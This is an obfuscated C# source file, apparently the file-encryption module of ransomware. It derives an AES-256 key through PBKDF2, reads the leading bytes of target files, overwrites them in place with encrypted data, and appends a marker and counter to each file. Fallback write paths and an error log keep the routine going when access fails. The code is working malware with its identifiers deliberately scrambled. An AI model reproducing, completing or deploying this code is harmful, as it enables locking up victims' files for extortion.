using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;

namespace OeQGwjtftIBDg;

public static class IuIIhDBsGDXt
{
	public static byte[] hzCfVwhNVmpN(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = vANxCCjfnHkdGrB(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes vANxCCjfnHkdGrB(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] dbNTPTvtWbWOCoG(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (jSdbwwLMlbK.loBrWClZEFFu == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (jSdbwwLMlbK.NZZJwvuCaIyu)
			{
				try
				{
					File.AppendAllText(jSdbwwLMlbK.agUGmZJGeSw, "File: " + string_0 + " - Error while reading from file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool dfpNpoHXtKEP(string DOYGxpRQSwJj, byte[] giNofYHUtqNeDrVh, byte[] DdudrgeqXqE = null)
	{
		try
		{
			byte[] array = null;
			if (jSdbwwLMlbK.loBrWClZEFFu == "YES")
			{
				array = (jSdbwwLMlbK.cqwcNhPdCH ? Encoding.ASCII.GetBytes(jSdbwwLMlbK.aOUUGKAtMbj(jSdbwwLMlbK.MUQqnnxefeYQYg) + jSdbwwLMlbK.aOUUGKAtMbj("Kw==") + Convert.ToString(jSdbwwLMlbK.QwggfFbICMPoft) + jSdbwwLMlbK.aOUUGKAtMbj("Kw==")) : Encoding.ASCII.GetBytes(jSdbwwLMlbK.aOUUGKAtMbj(jSdbwwLMlbK.MUQqnnxefeYQYg) + jSdbwwLMlbK.aOUUGKAtMbj("LQ==") + Convert.ToString(jSdbwwLMlbK.QwggfFbICMPoft) + jSdbwwLMlbK.aOUUGKAtMbj("LQ==")));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(DOYGxpRQSwJj, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(giNofYHUtqNeDrVh, 0, giNofYHUtqNeDrVh.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(DOYGxpRQSwJj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!jSdbwwLMlbK.cqwcNhPdCH)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(DdudrgeqXqE, 0, DdudrgeqXqE.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (jSdbwwLMlbK.cqwcNhPdCH ? Encoding.ASCII.GetBytes(jSdbwwLMlbK.aOUUGKAtMbj(jSdbwwLMlbK.MUQqnnxefeYQYg) + jSdbwwLMlbK.aOUUGKAtMbj("Kw==") + Convert.ToString(jSdbwwLMlbK.QwggfFbICMPoft) + jSdbwwLMlbK.aOUUGKAtMbj("Kw==")) : Encoding.ASCII.GetBytes(jSdbwwLMlbK.aOUUGKAtMbj(jSdbwwLMlbK.MUQqnnxefeYQYg) + jSdbwwLMlbK.aOUUGKAtMbj("LQ==") + Convert.ToString(jSdbwwLMlbK.QwggfFbICMPoft) + jSdbwwLMlbK.aOUUGKAtMbj("LQ==")));
				FileStream fileStream2 = new FileStream(DOYGxpRQSwJj, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(giNofYHUtqNeDrVh, 0, giNofYHUtqNeDrVh.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(DOYGxpRQSwJj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!jSdbwwLMlbK.cqwcNhPdCH)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(DdudrgeqXqE, 0, DdudrgeqXqE.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			jSdbwwLMlbK.RGcMmldgjxiBCQ++;
		}
		catch (Exception ex)
		{
			if (jSdbwwLMlbK.NZZJwvuCaIyu)
			{
				try
				{
					File.AppendAllText(jSdbwwLMlbK.agUGmZJGeSw, "File: " + DOYGxpRQSwJj + " - Error while partial writing to file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (jSdbwwLMlbK.cqwcNhPdCH ? Encoding.ASCII.GetBytes(jSdbwwLMlbK.aOUUGKAtMbj(jSdbwwLMlbK.MUQqnnxefeYQYg) + jSdbwwLMlbK.aOUUGKAtMbj("Kw==") + Convert.ToString(jSdbwwLMlbK.QwggfFbICMPoft) + jSdbwwLMlbK.aOUUGKAtMbj("Kw==")) : Encoding.ASCII.GetBytes(jSdbwwLMlbK.aOUUGKAtMbj(jSdbwwLMlbK.MUQqnnxefeYQYg) + jSdbwwLMlbK.aOUUGKAtMbj("LQ==") + Convert.ToString(jSdbwwLMlbK.QwggfFbICMPoft) + jSdbwwLMlbK.aOUUGKAtMbj("LQ==")));
				FileStream fileStream4 = new FileStream(DOYGxpRQSwJj, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(giNofYHUtqNeDrVh, 0, giNofYHUtqNeDrVh.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(DOYGxpRQSwJj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!jSdbwwLMlbK.cqwcNhPdCH)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(DdudrgeqXqE, 0, DdudrgeqXqE.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}
}
